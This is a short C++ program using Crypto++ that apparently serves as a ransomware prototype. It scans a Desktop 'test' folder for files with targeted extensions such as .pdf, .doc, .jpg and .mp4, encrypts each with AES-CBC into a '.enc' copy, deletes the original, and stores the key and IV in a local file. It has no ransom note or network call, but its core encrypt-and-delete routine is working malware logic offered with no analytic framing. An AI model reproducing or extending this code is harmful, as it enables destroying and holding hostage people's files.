#include <iostream>
#include <fstream>
#include <filesystem>
#include <cryptopp/aes.h>
#include <cryptopp/osrng.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>
#include <cryptopp/secblock.h>
#include <set>

namespace fs = std::filesystem;
using namespace CryptoPP;

void encrypt_file(const std::string& filepath, const SecByteBlock& key, const byte iv[AES::BLOCKSIZE]) {
    try {
        std::ifstream in(filepath, std::ios::binary);
        std::string plain((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
        in.close();

        std::string ciphertext;
        CBC_Mode<AES>::Encryption encryptor;
        encryptor.SetKeyWithIV(key, key.size(), iv);

        StringSource ss(plain, true,
            new StreamTransformationFilter(encryptor,
                new StringSink(ciphertext)
            )
        );

        std::ofstream out(filepath + ".enc", std::ios::binary);
        out.write(ciphertext.data(), ciphertext.size());
        out.close();

        fs::remove(filepath);

        std::cout << "encrypted: " << filepath << std::endl;
    }
    catch (const std::exception& e) {
        std::cerr << "failed encrypt: " << filepath << ": " << e.what() << std::endl;
    }
}

bool is_target_extension(const std::string& ext) {
    static const std::set<std::string> target_exts = {
        ".pdf", ".doc", ".exe", ".png", ".jpg", ".jpeg", ".txt", ".apk", ".mp4", ".mkv"
    };
    return target_exts.find(ext) != target_exts.end();
}

int main() {
    std::string home = getenv("HOME");
    std::string targetDir = home + "/Desktop/test";

    AutoSeededRandomPool prng;
    SecByteBlock key(AES::DEFAULT_KEYLENGTH);
    byte iv[AES::BLOCKSIZE];
    prng.GenerateBlock(key, key.size());
    prng.GenerateBlock(iv, AES::BLOCKSIZE);

    std::ofstream keyFile("aes.key", std::ios::binary);
    keyFile.write(reinterpret_cast<const char*>(&key[0]), key.size());
    keyFile.write(reinterpret_cast<const char*>(&iv[0]), AES::BLOCKSIZE);
    keyFile.close();

    for (const auto& entry : fs::directory_iterator(targetDir)) {
        if (entry.is_regular_file()) {
            std::string ext = entry.path().extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
            if (is_target_extension(ext)) {
                encrypt_file(entry.path().string(), key, iv);
            }
        }
    }

    std::cout << "encoded\n";
    return 0;
}
